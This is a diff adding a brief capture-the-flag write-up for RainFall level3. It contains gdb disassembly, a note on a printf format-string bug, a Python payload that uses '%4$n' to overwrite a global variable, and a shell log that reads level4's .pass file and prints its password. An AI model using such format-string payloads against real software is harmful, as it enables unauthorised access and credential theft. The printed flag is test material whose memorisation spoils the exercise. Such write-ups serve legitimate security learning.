@@ -1,0 +1,25 @@
+(gdb) disassemble main
+
+0x08048520 <+6>:	call   0x80484a4 <v>
+
+(gdb) disassemble v
+
+0x080484d5 <+49>:	call   0x8048390 <printf@plt> // the buffer is passed directly to printf format strings, so we can use %x to see memory and %n to write the n printed characters to the buffer
+
+import struct
+
+mAddr = struct.pack("I", 0x804988c)
+
+print mAddr+("a"*60)+"%4$n"
+
+
+level3@RainFall:~$ cat pl - | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+whoami
+level4
+cd ..
+cd level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
